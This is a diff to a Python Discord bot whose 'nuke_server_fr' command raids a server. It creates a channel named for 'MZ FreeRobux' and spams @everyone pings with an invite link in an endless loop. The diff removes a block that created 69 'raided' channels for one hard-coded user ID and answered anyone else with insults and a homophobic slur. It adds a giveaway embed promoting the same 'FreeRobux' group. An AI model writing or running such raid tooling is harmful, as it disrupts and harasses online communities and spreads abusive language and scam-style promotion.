@@ -195,17 +195,6 @@ async def nuke_server_fr(ctx):
 
         await nuke_channel_2(ctx)
 
-        async def create_random_channels(txt2):
-            if str(txt2.author.id) != '762152955382071316':
-                print(str(txt2.author.id), "Tried to nuke channel:", txt2.channel, "by using .nuke")
-                await txt2.send("LOL ONLY <@762152955382071316> can nuke this channel, get lost noob\n**YOU GAY**")
-            else:
-                guild = txt2.message.guild
-                for i in range(69):
-                    guild.create_text_channel(name='raided-bitch')
-                    
-        await create_random_channels(txt2=ctx)
-
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
@@ -222,9 +211,22 @@ async def nuke_server_fr(ctx):
         while True:
             await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
                                   'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
-#ban part broken for now
 
 
+# ban part broken for now
+
+@bot.command(name='gg', help='GG, Stay!')
+@commands.has_role("Giveaways")
+async def ggstay(ctx, server):
+    embedVar = discord.Embed(title=f"GG! Stay in **{server}**", description=f"""We won! Stay in that server (**{server}**) to ensure the win!
+<a:arrow_animated:875302270173085716> Didn't get a chance to join?
+<a:arrow_blue:874953616048402442> Make sure to prioritize MZ FreeRobux pings!
+    
+<a:arrow_blue:874953616048402442> Keep us on top for an exclusive role as well! 
+
+Keep your eyes here so you don't miss out! <a:verified:869847537547378710>""", color=0x00ff08)
+
+    await ctx.send(embedVar)
 
 
 bot.run(TOKEN)
